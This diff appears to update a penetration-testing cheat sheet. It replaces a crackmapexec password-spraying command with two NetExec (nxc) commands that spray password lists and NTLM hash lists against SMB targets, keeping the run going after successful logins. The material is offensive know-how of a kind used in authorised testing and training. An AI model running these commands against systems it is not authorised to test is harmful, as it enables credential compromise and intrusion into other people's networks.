@@ -2,10 +2,14 @@
 
 <details>
 
-<summary>Password Spraying</summary>
+<summary>Credentials Spraying (hashes/passwords)</summary>
 
 ```bash
-crackmapexec smb 192.168.165.122 -u user.txt -p password --continue-on-success 
+# Spray Hashes
+nxc smb target.txt -u user.txt -H hashes.txt --continue-on-success
+
+# Spray Passwords
+nxc smb target.txt -u user.txt -p passwords.txt --continue-on-success
 ```
 
 </details>
